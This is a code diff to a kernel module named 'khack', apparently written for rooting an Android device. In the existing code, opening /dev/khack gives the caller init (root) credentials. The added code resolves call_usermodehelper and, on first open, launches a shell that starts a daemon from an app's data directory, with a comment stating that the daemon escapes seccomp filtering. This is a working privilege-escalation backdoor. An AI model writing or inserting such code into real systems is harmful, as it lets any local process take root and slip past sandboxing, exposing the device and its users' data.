@@ -96,6 +96,29 @@ static int khack_clear_enforcing(void)
 }
 
 /* open("/dev/khack") -> caller's creds become init_cred */
+static atomic_t daemon_started = ATOMIC_INIT(0);
+
+/* Runs from the open() path, i.e. in a normal process context after /data is
+ * mounted.  call_usermodehelper spawns the helper from the kernel, so the
+ * daemon it starts carries no seccomp filter. */
+static void khack_spawn_daemon(void)
+{
+	typedef int (*umh_fn)(const char *path, char **argv, char **envp, int wait);
+	umh_fn umh = (umh_fn)__symbol_get("call_usermodehelper");
+	static char *argv[] = { "/system/bin/sh", "-c",
+		"echo UMH-RAN > /dev/kmsg; "
+		"setsid /data/data/df.root/files/bin/dfsud </dev/null >/dev/null 2>&1 & "
+		"sleep 1; echo UMH-DONE > /dev/kmsg", NULL };
+	static char *envp[] = { "PATH=/system/bin:/system/xbin", "HOME=/", NULL };
+
+	if (!umh)
+		return;
+	if (atomic_cmpxchg(&daemon_started, 0, 1) != 0)
+		return;
+	pr_info("khack1: spawning daemon from open path\n");
+	umh("/system/bin/sh", argv, envp, 2 /* UMH_NO_WAIT */);
+}
+
 static int khack_open(struct inode *inode, struct file *file)
 {
 	void *cred;
@@ -109,6 +132,7 @@ static int khack_open(struct inode *inode, struct file *file)
 
 	p_commit_creds(cred);
 	pr_info("khack1: caller escalated to init_cred\n");
+	khack_spawn_daemon();
 	return 0;
 }
 
